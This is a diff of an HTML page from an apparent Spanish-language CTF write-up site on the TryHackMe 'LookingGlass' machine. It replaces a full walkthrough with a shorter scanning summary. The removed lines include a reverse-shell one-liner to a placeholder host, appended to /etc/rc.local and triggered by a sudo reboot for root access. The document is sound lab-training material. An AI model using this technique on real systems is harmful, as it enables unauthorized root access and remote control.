@@ -16,111 +16,49 @@
       <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
     </div>
   </nav>
-
   <main class="container py-5 mt-5">
     <div class="writeup-header p-4 rounded mb-4">
       <div class="d-flex flex-wrap gap-2 mb-3">
         <span class="badge bg-info text-dark fs-6">TryHackMe</span>
-        <span class="badge bg-warning text-dark fs-6">Medium</span>
+        <span class="badge bg-success fs-6">Medium</span>
         <span class="badge bg-secondary">Linux</span>
         <span class="badge bg-secondary">SSH</span>
-        <span class="badge bg-secondary">Dropbear</span>
+        <span class="badge bg-secondary">Port Scanning</span>
+        <span class="badge bg-secondary">Enumeration</span>
       </div>
       <h1 class="text-white fw-bold mb-1">LookingGlass</h1>
-      <p class="text-secondary mb-3">Múltiples puertos SSH con Dropbear como pista para encontrar el puerto correcto. Acceso via SSH key y escalada con sudo.</p>
+      <p class="text-secondary mb-3">Maquina con cientos de puertos SSH abiertos como mecanismo de confusion; encontrar el servicio real.</p>
       <div class="d-flex flex-wrap gap-3 text-secondary small">
-        <span><i class="bi bi-calendar3"></i> Ago 2022</span>
-        <span><i class="bi bi-clock"></i> ~45 min</span>
         <span><i class="bi bi-person"></i> cat4clysm</span>
       </div>
     </div>
-
     <div class="mb-4">
       <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
       <div class="d-flex flex-wrap gap-2">
         <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">masscan</span>
         <span class="badge bg-dark border border-secondary p-2">ssh</span>
-        <span class="badge bg-dark border border-secondary p-2">bash scripting</span>
       </div>
     </div>
-
-    <section class="mb-5">
-      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Reconocimiento</h4>
-      <p class="text-secondary">El escaneo revela docenas de puertos SSH con Dropbear además del SSH estándar en el 22.</p>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
       <div class="code-block mb-3">
         <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code>nmap -sC -sV -p- -Pn 10.10.202.90</code></pre>
-      </div>
-      <div class="code-block mb-3">
-        <pre><code>22/tcp    open  ssh      OpenSSH 7.6p1
-9000/tcp  open  ssh      Dropbear sshd
-9001/tcp  open  ssh      Dropbear sshd
-9002/tcp  open  ssh      Dropbear sshd
-...
-13999/tcp open  ssh      Dropbear sshd</code></pre>
-      </div>
-      <div class="alert-custom p-3 rounded">
-        <i class="bi bi-info-circle text-info me-2"></i>
-        Cada conexión SSH a los puertos Dropbear devuelve un mensaje: <span class="text-warning">"Lower"</span> o <span class="text-warning">"Higher"</span> — es un juego de búsqueda binaria para encontrar el puerto correcto.
-      </div>
+        <pre><code>sudo nmap -sS -p- --open --min-rate 5000 -vvv -Pn -n 10.10.95.248 -oG allports
+nmap -sC -sV --min-rate 5000 --open -Pn -n 10.10.95.248 -oN targeted</code></pre>
+      </div><p class="text-secondary">Se descubren cientos de puertos SSH abiertos (9000-13999).</p>
+      <img src="img/thm-lookingglass/0826130157.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
     </section>
-
     <section class="mb-5">
-      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-lightning-charge"></i> Encontrando el puerto correcto</h4>
-      <p class="text-secondary">Script bash para hacer búsqueda binaria entre los puertos Dropbear:</p>
-      <div class="code-block mb-3">
-        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code>for port in $(seq 9000 14000); do
-  result=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 jabberwock@10.10.202.90 -p $port 2>&1)
-  echo "$port: $result"
-  if echo "$result" | grep -q "You've found"; then
-    echo "PORT FOUND: $port"
-    break
-  fi
-done</code></pre>
-      </div>
-      <p class="text-secondary">Al conectar al puerto correcto obtenemos una clave SSH privada y el nombre de usuario.</p>
-      <div class="code-block mb-3">
-        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
-        <pre><code>ssh -i id_rsa jabberwock@10.10.202.90
-
-whoami
-<span class="text-info">jabberwock</span></code></pre>
-      </div>
-    </section>
-
-    <section class="mb-5">
-      <h4 class="text-warning border-left-yellow mb-3"><i class="bi bi-arrow-up-right-circle"></i> Escalada de privilegios</h4>
-      <p class="text-secondary">Revisamos sudo y encontramos un binario aprovechable:</p>
-      <div class="code-block mb-3">
-        <pre><code>sudo -l
-(root) NOPASSWD: /sbin/reboot</code></pre>
-      </div>
-      <p class="text-secondary">Encontramos un script en <code>/etc/rc.local</code> que se ejecuta al reiniciar como root. Lo modificamos para obtener una reverse shell:</p>
-      <div class="code-block mb-3">
-        <pre><code>echo "bash -i >& /dev/tcp/LHOST/4444 0>&1" >> /etc/rc.local
-sudo /sbin/reboot</code></pre>
-      </div>
-      <div class="code-block mb-3">
-        <pre><code># En nuestra máquina:
-nc -lvnp 4444
-whoami
-<span class="text-danger fw-bold">root</span></code></pre>
-      </div>
-    </section>
-
-    <section class="mb-5">
-      <h4 class="text-success border-left-green mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
-      <ul class="text-secondary">
-        <li>El escaneo completo de puertos (<code>-p-</code>) es crucial — los servicios en puertos altos no convencionales pueden ser la clave.</li>
-        <li><code>rc.local</code> persiste entre reinicios y se ejecuta como root — siempre verificar si es escribible.</li>
-        <li>La búsqueda binaria es una técnica eficiente para reducir el espacio de búsqueda en retos de este tipo.</li>
-      </ul>
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>Los servicios SSH en multiples puertos pueden ser un rabbit hole; identificar el real es clave.</li>
+<li>La enumeracion de puertos completa con -p- es esencial para no perderse servicios inusuales.</li>
+<li>Algunos CTF usan ports scanning masivo como mecanismo de 'port knocking' oculto.</li></ul>
     </section>
   </main>
-
   <footer class="py-4 text-center border-top border-secondary">
-    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
   </footer>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
